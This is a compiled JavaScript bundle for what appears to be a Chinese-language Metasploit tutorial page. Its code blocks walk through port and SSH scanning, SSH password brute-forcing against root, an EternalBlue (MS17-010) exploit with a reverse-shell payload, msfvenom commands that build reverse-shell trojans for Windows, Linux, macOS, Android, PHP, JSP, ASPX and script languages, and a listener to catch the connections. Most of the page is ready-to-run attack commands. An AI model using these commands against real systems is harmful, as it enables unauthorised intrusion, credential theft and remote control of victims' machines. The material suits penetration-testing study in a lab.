(window.webpackJsonp=window.webpackJsonp||[]).push([[76],{382:function(s,e,t){"use strict";t.r(e);var r=t(22),a=Object(r.a)({},(function(){var s=this,e=s.$createElement,t=s._self._c||e;return t("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[t("h1",{attrs:{id:"metersploit"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#metersploit"}},[s._v("#")]),s._v(" metersploit")]),s._v(" "),t("h2",{attrs:{id:"目录"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#目录"}},[s._v("#")]),s._v(" 目录")]),s._v(" "),t("ol",[t("li",[s._v("docker中使用metasploit")]),s._v(" "),t("li",[s._v("端口扫描")]),s._v(" "),t("li",[s._v("信息收集")]),s._v(" "),t("li",[s._v("账密破解")]),s._v(" "),t("li",[s._v("漏洞利用")]),s._v(" "),t("li",[s._v("木马反弹")])]),s._v(" "),t("h2",{attrs:{id:"_1-docker中运行"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_1-docker中运行"}},[s._v("#")]),s._v(" 1.docker中运行")]),s._v(" "),t("div",{staticClass:"language- extra-class"},[t("pre",[t("code",[s._v("docker pull metasploitframework/metasploit-framework\ndocker run -it 09378b8c0503\n")])])]),t("h3",{attrs:{id:"截图"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#截图"}},[s._v("#")]),s._v(" 截图:")]),s._v(" "),t("p",[t("img",{attrs:{src:"/websec/tools/metersploit/msf_docker.png",alt:""}})]),s._v(" "),t("h2",{attrs:{id:"_2-端口扫描"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_2-端口扫描"}},[s._v("#")]),s._v(" 2.端口扫描")]),s._v(" "),t("div",{staticClass:"language- extra-class"},[t("pre",[t("code",[s._v("msf5 >search portscan\nmsf5 >use auxiliary/scanner/portscan/syn\nmsf5 auxiliary(scanner/portscan/syn) > set RHOSTS 10.211.55.6\nmsf5 auxiliary(scanner/portscan/syn) > run\n")])])]),t("h3",{attrs:{id:"截图-2"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#截图-2"}},[s._v("#")]),s._v(" 截图:")]),s._v(" "),t("p",[t("img",{attrs:{src:"/websec/tools/metersploit/portscan_1.png",alt:""}}),s._v(" "),t("img",{attrs:{src:"/websec/tools/metersploit/portscan_2.png",alt:""}})]),s._v(" "),t("h2",{attrs:{id:"_3-信息收集"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_3-信息收集"}},[s._v("#")]),s._v(" 3.信息收集")]),s._v(" "),t("div",{staticClass:"language- extra-class"},[t("pre",[t("code",[s._v("msf5 > search _version\nmsf5 > use auxiliary/scanner/ssh/ssh_version\nmsf5 auxiliary(scanner/ssh/ssh_version) > set RHOSTS 10.211.55.6\nmsf5 auxiliary(scanner/ssh/ssh_version) > run\n")])])]),t("h3",{attrs:{id:"截图-3"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#截图-3"}},[s._v("#")]),s._v(" 截图:")]),s._v(" "),t("p",[t("img",{attrs:{src:"/websec/tools/metersploit/info_1.png",alt:""}}),s._v(" "),t("img",{attrs:{src:"/websec/tools/metersploit/info_2.png",alt:""}})]),s._v(" "),t("h2",{attrs:{id:"_4-账密破解"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_4-账密破解"}},[s._v("#")]),s._v(" 4.账密破解")]),s._v(" "),t("div",{staticClass:"language- extra-class"},[t("pre",[t("code",[s._v("msf5 > search _login\nmsf5 > use auxiliary/scanner/ssh/ssh_login\nmsf5 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 10.211.55.6\nmsf5 auxiliary(scanner/ssh/ssh_login) > set USERNAME root\nmsf5 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE /OPT/passwd\nmsf5 auxiliary(scanner/ssh/ssh_version) > run\n")])])]),t("h3",{attrs:{id:"截图-4"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#截图-4"}},[s._v("#")]),s._v(" 截图:")]),s._v(" "),t("p",[t("img",{attrs:{src:"/websec/tools/metersploit/userpass_1.png",alt:""}}),s._v(" "),t("img",{attrs:{src:"/websec/tools/metersploit/userpass_2.png",alt:""}})]),s._v(" "),t("h2",{attrs:{id:"_5-漏洞利用"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_5-漏洞利用"}},[s._v("#")]),s._v(" 5.漏洞利用")]),s._v(" "),t("div",{staticClass:"language- extra-class"},[t("pre",[t("code",[s._v("msf5 > search ms17-010\nmsf5 > use exploit/windows/smb/ms17_010_eternalblue\nmsf5 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.211.55.1\nmsf5 exploit(windows/smb/ms17_010_eternalblue) > show payloads    #查看当前exploit支持的payloads\nmsf5 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/powershell_reverse_tcp\nmsf5 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.211.55.100\nmsf5 exploit(windows/smb/ms17_010_eternalblue) > set LPORT 6666\nmsf5 exploit(windows/smb/ms17_010_eternalblue) > exploit\n")])])]),t("h3",{attrs:{id:"截图-5"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#截图-5"}},[s._v("#")]),s._v(" 截图:")]),s._v(" "),t("p",[t("img",{attrs:{src:"/websec/tools/metersploit/vul_1.png",alt:""}}),s._v(" "),t("img",{attrs:{src:"/websec/tools/metersploit/vul_2.png",alt:""}}),s._v(" "),t("img",{attrs:{src:"/websec/tools/metersploit/vul_3.png",alt:""}}),s._v(" "),t("img",{attrs:{src:"/websec/tools/metersploit/vul_4.png",alt:""}})]),s._v(" "),t("h2",{attrs:{id:"_6-木马反弹"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_6-木马反弹"}},[s._v("#")]),s._v(" 6.木马反弹")]),s._v(" "),t("h3",{attrs:{id:"生成木马"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#生成木马"}},[s._v("#")]),s._v(" 生成木马")]),s._v(" "),t("div",{staticClass:"language- extra-class"},[t("pre",[t("code",[s._v("windows: msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.2.146 LPORT=44444 X >test.exe\nlinux: msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.2.146 LPORT=1234 X >text\nmac: msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho\nandroid: msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.2.146 LPORT=1234 R >text.apk\njava: msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.2.146 LPORT=1234 W >text.jar\nwar: msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war\nphp: msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.2.146 LPORT=1234 -f raw >text.php\nasp : msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.2.146 LPORT=1234 -f asp > shell.asp\naspx: msfvenom -a x86 --platform win -p windows/meterpreter/reverse_tcp LHOST= 192.168.1.109 LPORT=7788 -f aspx x> /home/niexinming/back.aspx\npython: msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py\njsp: msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.2.146 LPORT=1234 R >text.jsp\nperl: msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl\nbash: msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh\n")])])]),t("h3",{attrs:{id:"监听等待反弹"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#监听等待反弹"}},[s._v("#")]),s._v(" 监听等待反弹")]),s._v(" "),t("div",{staticClass:"language- extra-class"},[t("pre",[t("code",[s._v("msf5 > use exploit/multi/handler\nmsf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp\nmsf5 exploit(multi/handler) > set LHOST 10.211.55.100\nmsf5 exploit(multi/handler) > set LPORT 4444\nmsf5 exploit(multi/handler) > run")])])])])}),[],!1,null,null,null);e.default=a.exports}}]);